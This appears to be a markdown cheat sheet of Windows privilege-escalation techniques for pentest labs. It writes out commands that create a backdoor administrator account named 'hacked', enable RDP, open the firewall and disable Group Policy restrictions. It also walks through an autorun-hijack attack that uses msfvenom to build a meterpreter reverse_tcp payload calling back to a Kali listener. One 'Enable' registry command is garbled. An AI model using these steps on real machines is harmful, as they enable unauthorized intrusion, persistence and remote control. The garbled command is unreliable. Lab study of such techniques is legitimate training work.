# Windows Privlage Escalation
![alt text](https://miro.medium.com/max/2400/0*I-5KzneqUHfF7bHR.png)
## Kernel Exploits
- https://github.com/SecWiki/windows-kernel-exploits
## Admin Service that a Standard User can run
- https://www.youtube.com/watch?v=3BQKpPNlTSo
## Run Executable in Background
````
start /B program
````
## Disable/Enable Group Policy
- Disable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
````
## Enable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /0 REG_DWORD /d 1 /f
Add Admin & Enable RDP
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup Administrateurs hacked /add (For French target)
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
````
## xfreerdp
````
xfreerdp /v:10.10.25.227 /u:Wade /p:parzival /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
````
#### Credit
- Taken from Tib3rius

## Basic Enumeration
- Find out the users on the box and enumerate their privlages
````
net users
net users Administrator
````
## Registry Escalation - Autoruns
- Detection
- 1. Open command prompt and type: 
````
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
````
- 2. In Autoruns, click on the `Logon` tab.
- 3. From the listed results, notice that the “My Program” entry is pointing to 
````
C:\Program Files\Autorun Program\program.exe
````
- 4. In command prompt type: 
````
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
````
- 5. From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file.
- Exploitation
- Kali VM
- 1. Open command prompt and type: `msfconsole`
- 2. In Metasploit (msf > prompt) type: `use multi/handler`
- 3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp` or `windows/x64/shell/reverse_tcp`
- 4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
- 5. In Metasploit (msf > prompt) type: `run`
- 6. Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
- 7. Copy the generated file, `program.exe`, to the Windows VM.
- Windows VM
- 1. Place `program.exe` in `C:\Program Files\Autorun Program`
- 2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
- Kali VM
- 1. Wait for a new session to open in Metasploit.
- 2. In Metasploit (msf > prompt) type: `sessions -i [Session ID]`
- 3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: `getuid`
- 



















